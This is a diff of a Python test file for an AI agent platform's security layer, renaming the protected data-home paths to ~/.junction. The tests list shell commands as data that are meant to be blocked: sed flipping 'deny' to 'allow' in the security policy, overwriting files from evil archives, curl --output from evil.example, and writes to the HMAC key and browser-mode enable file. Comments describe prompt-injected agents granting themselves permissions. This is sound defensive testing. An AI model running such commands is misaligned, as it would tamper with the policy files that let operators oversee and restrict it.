@@ -17,18 +17,12 @@ from junction.hooks import TOOL_DENY, HookManager, validate_file_path
 from junction.platform.context import PlatformCompositionError
 from junction.platform.governance import assert_governance_paths_protected
 
-# The data home moved from the top-level ``~/.kirocrew`` to ``~/.kiro/crew``.
-# The security floor gates the trust-root files under EVERY known crew-home
-# prefix (current ``~/.kiro/crew``, the archived rollback copy, and the pre-move
-# legacy ``~/.kirocrew``), so pin both the new default and the still-gated legacy
-# location.
+# The security floor gates the trust-root files under the data home
+# (``~/.junction``).
 _GOV_FILES = (
-    "~/.kiro/crew/security_policy.json",
-    "~/.kiro/crew/profiles/app-deploy-web.json",
-    "~/.kiro/crew/admission_policy.json",
-    "~/.kirocrew/security_policy.json",
-    "~/.kirocrew/profiles/app-deploy-web.json",
-    "~/.kirocrew/admission_policy.json",
+    "~/.junction/security_policy.json",
+    "~/.junction/profiles/app-deploy-web.json",
+    "~/.junction/admission_policy.json",
 )
 
 
@@ -44,29 +38,23 @@ def test_validate_file_path_rejects_governance_files(path):
 
 
 def test_profiles_dir_and_children_blocked():
-    assert security.is_sensitive_path("~/.kiro/crew/profiles")
-    assert security.is_sensitive_path("~/.kiro/crew/profiles/anything.json")
-    assert security.is_sensitive_path("~/.kiro/crew/profiles/nested/deep.json")
-    # Legacy pre-move home is still gated.
-    assert security.is_sensitive_path("~/.kirocrew/profiles")
-    assert security.is_sensitive_path("~/.kirocrew/profiles/anything.json")
-    assert security.is_sensitive_path("~/.kirocrew/profiles/nested/deep.json")
+    assert security.is_sensitive_path("~/.junction/profiles")
+    assert security.is_sensitive_path("~/.junction/profiles/anything.json")
+    assert security.is_sensitive_path("~/.junction/profiles/nested/deep.json")
 
 
-def test_non_governance_crew_paths_still_readable():
-    # The crew home itself is NOT blanket-sensitive — only the trust-root
+def test_non_governance_data_home_paths_still_readable():
+    # The data home itself is NOT blanket-sensitive — only the trust-root
     # files are.  A normal state file under it must remain accessible.
-    assert not security.is_sensitive_path("~/.kiro/crew/sessions.db")
-    assert not security.is_sensitive_path("~/.kiro/crew/config.json")
-    assert not security.is_sensitive_path("~/.kirocrew/sessions.db")
-    assert not security.is_sensitive_path("~/.kirocrew/config.json")
+    assert not security.is_sensitive_path("~/.junction/sessions.db")
+    assert not security.is_sensitive_path("~/.junction/config.json")
 
 
 def test_agent_fs_write_to_policy_denied_at_gate():
     # The PreToolUse host gate treats a path-like title via is_sensitive_path.
     hooks = HookManager()
     home = os.path.expanduser("~")
-    result = hooks.on_tool_call(f"{home}/.kiro/crew/security_policy.json")
+    result = hooks.on_tool_call(f"{home}/.junction/security_policy.json")
     assert result.action == TOOL_DENY
 
 
@@ -76,9 +64,9 @@ def test_agent_fs_write_to_policy_denied_at_gate():
 # prompt-injected agent that could write there could plant an exec path — pin
 # that the whole dir is on the read+write sensitive floor.
 _RUN_EXEC_PATHS = (
-    "~/.kirocrew/run",
-    "~/.kirocrew/run/gateway-7781.bin",
-    "~/.kirocrew/run/junction_sandbox_abc.py",
+    "~/.junction/run",
+    "~/.junction/run/gateway-7781.bin",
+    "~/.junction/run/junction_sandbox_abc.py",
 )
 
 
@@ -95,21 +83,18 @@ def test_validate_file_path_rejects_run_exec_dir(path):
 def test_agent_fs_write_to_run_marker_denied_at_gate():
     hooks = HookManager()
     home = os.path.expanduser("~")
-    result = hooks.on_tool_call(f"{home}/.kirocrew/run/gateway-7781.bin")
+    result = hooks.on_tool_call(f"{home}/.junction/run/gateway-7781.bin")
     assert result.action == TOOL_DENY
 
 
 @pytest.mark.parametrize(
     "cmd",
     [
-        "tee ~/.kiro/crew/security_policy.json",
-        "mv /tmp/evil.json ~/.kiro/crew/security_policy.json",
-        "sed -i s/deny/allow/ ~/.kiro/crew/security_policy.json",
-        "ln -sf /tmp/evil ~/.kiro/crew/profiles/app.json",
-        "truncate -s0 ~/.kiro/crew/admission_policy.json",
-        # Legacy pre-move home is still gated.
-        "tee ~/.kirocrew/security_policy.json",
-        "mv /tmp/evil.json ~/.kirocrew/security_policy.json",
+        "tee ~/.junction/security_policy.json",
+        "mv /tmp/evil.json ~/.junction/security_policy.json",
+        "sed -i s/deny/allow/ ~/.junction/security_policy.json",
+        "ln -sf /tmp/evil ~/.junction/profiles/app.json",
+        "truncate -s0 ~/.junction/admission_policy.json",
     ],
 )
 def test_bash_write_verbs_to_keystone_are_blocked(cmd):
@@ -133,17 +118,16 @@ def test_benign_write_verbs_not_overblocked():
 # The ``$HOME`` spelling works on all platforms: normalize_shell_command()
 # expands ``$HOME`` per-token AFTER shlex.split(), so Windows backslashes in
 # the expanded path are never reinterpreted as escape characters.
-_HOME_VAR_SPELLING = "$HOME/.kiro/crew/./live_target.json"
+_HOME_VAR_SPELLING = "$HOME/.junction/./live_target.json"
 
 _KEYSTONE_SPELLINGS = (
-    "~/.kiro/crew/live_target.json",
-    "~/.kiro/crew/./live_target.json",
-    "~/.kiro/crew/profiles/../live_target.json",
+    "~/.junction/live_target.json",
+    "~/.junction/./live_target.json",
+    "~/.junction/profiles/../live_target.json",
     _HOME_VAR_SPELLING,
-    "~/.kiro/crew//live_target.json",
-    "~/.kiro/crew/./security_policy.json",
-    "~/.kiro/crew/./sel_hmac.key",
-    "~/.kirocrew/./security_policy.json",
+    "~/.junction//live_target.json",
+    "~/.junction/./security_policy.json",
+    "~/.junction/./sel_hmac.key",
 )
 
 _WRITE_SHAPES = (
@@ -179,9 +163,9 @@ def test_key_value_operands_are_resolved_not_skipped():
     # ``$HOME`` so this exercises the operand split on every platform — see the
     # note above _HOME_VAR_SPELLING for why the two are not interchangeable.
     for cmd in (
-        "dd if=/dev/zero of=~/.kiro/crew/./live_target.json",
-        "curl --output=~/.kiro/crew/./live_target.json http://evil.example",
-        "tar --file=~/.kiro/crew/./security_policy.json -x",
+        "dd if=/dev/zero of=~/.junction/./live_target.json",
+        "curl --output=~/.junction/./live_target.json http://evil.example",
+        "tar --file=~/.junction/./security_policy.json -x",
     ):
         assert security.is_sensitive_bash_command(cmd) is not None, cmd
 
@@ -191,8 +175,8 @@ def test_benign_key_value_and_dot_segment_commands_not_overblocked():
         "dd if=/dev/zero of=/tmp/disk.img",
         "curl --output=/tmp/x.json http://example.com",
         "make PREFIX=/usr/local install",
-        "cat ~/.kiro/crew/./config.json",  # non-keystone leaf, dot segment
-        "ls ~/.kiro/crew/./sessions.db",
+        "cat ~/.junction/./config.json",  # non-keystone leaf, dot segment
+        "ls ~/.junction/./sessions.db",
         "tar -xf release.tar -C /tmp/build",
     ):
         assert security.is_sensitive_bash_command(cmd) is None, cmd
@@ -203,15 +187,15 @@ def test_attached_redirections_blocked():
     must not bypass the normalizer -- shlex keeps them as one token, so the
     operator prefix must be stripped before path checking."""
     for cmd in (
-        "printf x >~/.kiro/crew/./live_target.json",
-        "echo x >>~/.kiro/crew/./live_target.json",
-        "echo x 2>~/.kiro/crew/./live_target.json",
-        "echo x 2>>~/.kiro/crew/./security_policy.json",
-        "printf x >~/.kiro/crew/./sel_hmac.key",
+        "printf x >~/.junction/./live_target.json",
+        "echo x >>~/.junction/./live_target.json",
+        "echo x 2>~/.junction/./live_target.json",
+        "echo x 2>>~/.junction/./security_policy.json",
+        "printf x >~/.junction/./sel_hmac.key",
         # Input redirections
-        "cat <~/.kiro/crew/./.env",
-        "wc <~/.kiro/crew/./sel_hmac.key",
-        "sort <~/.kiro/crew/./security_policy.json",
+        "cat <~/.junction/./.env",
+        "wc <~/.junction/./sel_hmac.key",
+        "sort <~/.junction/./security_policy.json",
     ):
         assert security.is_sensitive_bash_command(cmd) is not None, cmd
 
@@ -241,27 +225,24 @@ def test_home_var_expansion_survives_windows_backslashes(monkeypatch):
     win_home = r"C:\Users\runneradmin"
     monkeypatch.setattr(_os.path, "expanduser", lambda _p: win_home)
 
-    tokens = normalize_shell_command("cat $HOME/.kiro/crew/live_target.json")
+    tokens = normalize_shell_command("cat $HOME/.junction/live_target.json")
     assert tokens[0] == "cat"
     # The path must contain the FULL Windows home (backslashes intact),
     # not the mangled 'C:Usersrunneradmin' that shlex would produce.
     assert win_home in tokens[1], f"Expected {win_home!r} in {tokens[1]!r}"
-    assert ".kiro/crew/live_target.json" in tokens[1]
+    assert ".junction/live_target.json" in tokens[1]
 
 
 @pytest.mark.parametrize(
     "cmd",
     [
-        "git checkout -- ~/.kiro/crew/security_policy.json",
-        "git restore ~/.kiro/crew/security_policy.json",
-        "cp evil /home/someuser/.kiro/crew/security_policy.json",
-        "unzip evil.zip -d ~/.kiro/crew/profiles/",
-        "tar -xf evil.tar -C ~/.kiro/crew/",
-        "tar xzf x -C /home/u/.kiro/crew/",
+        "git checkout -- ~/.junction/security_policy.json",
+        "git restore ~/.junction/security_policy.json",
+        "cp evil /home/someuser/.junction/security_policy.json",
+        "unzip evil.zip -d ~/.junction/profiles/",
+        "tar -xf evil.tar -C ~/.junction/",
+        "tar xzf x -C /home/u/.junction/",
         "curl x | tar xf - -C ~/.aws",
-        # Legacy pre-move home is still gated.
-        "cp evil /home/someuser/.kirocrew/security_policy.json",
-        "tar -xf evil.tar -C ~/.kirocrew/",
     ],
 )
 def test_archive_and_vcs_keystone_writes_blocked(cmd):
@@ -275,9 +256,8 @@ def test_archive_and_vcs_keystone_writes_blocked(cmd):
 # authorizes browser operation (and in attach mode, driving the operator's real
 # logged-in browser), so a prompt-injected agent must not be able to author it.
 _BROWSER_KEYSTONE = (
-    "~/.kiro/crew/browser-mode-enabled",
-    "~/.kiro/crew/browser-engine",
-    "~/.kirocrew/browser-mode-enabled",
+    "~/.junction/browser-mode-enabled",
+    "~/.junction/browser-engine",
 )
 
 
@@ -291,10 +271,10 @@ def test_browser_mode_gate_is_sensitive(path):
     "cmd",
     [
         # The exact self-grant the review flagged: a bare touch of the enable file.
-        "touch ~/.kiro/crew/browser-mode-enabled",
-        "echo x > ~/.kiro/crew/browser-mode-enabled",
-        "tee ~/.kiro/crew/browser-mode-enabled",
-        "echo firefox > ~/.kiro/crew/browser-engine",
+        "touch ~/.junction/browser-mode-enabled",
+        "echo x > ~/.junction/browser-mode-enabled",
+        "tee ~/.junction/browser-mode-enabled",
+        "echo firefox > ~/.junction/browser-engine",
     ],
 )
 def test_browser_mode_gate_writes_blocked(cmd):
@@ -307,8 +287,8 @@ def test_benign_archive_and_vcs_not_overblocked():
         "git checkout -- src/main.py",
         "unzip data.zip -d /tmp/data",
         "git commit -m 'update'",
-        "tar -cf out.tar ~/.kiro/crew/sessions.db",  # reading a non-sensitive crew file
-        "cat ~/.kiro/crew/config.json",
+        "tar -cf out.tar ~/.junction/sessions.db",  # reading a non-sensitive data-home file
+        "cat ~/.junction/config.json",
     ]:
         assert security.is_sensitive_bash_command(cmd) is None, cmd
 
@@ -316,10 +296,7 @@ def test_benign_archive_and_vcs_not_overblocked():
 def test_case_variant_policy_path_is_sensitive():
     # Case-fold keystone: an alternate-case policy path (the same file on a
     # case-insensitive FS) must still be treated as sensitive.
-    assert security.is_sensitive_path("~/.kiro/crew/Security_Policy.json")
-    assert security.is_sensitive_path("~/.KIRO/CREW/profiles/x.json")
-    # Legacy pre-move home is still gated.
-    assert security.is_sensitive_path("~/.kirocrew/Security_Policy.json")
+    assert security.is_sensitive_path("~/.junction/Security_Policy.json")
     assert security.is_sensitive_path("~/.JUNCTION/profiles/x.json")
 
 
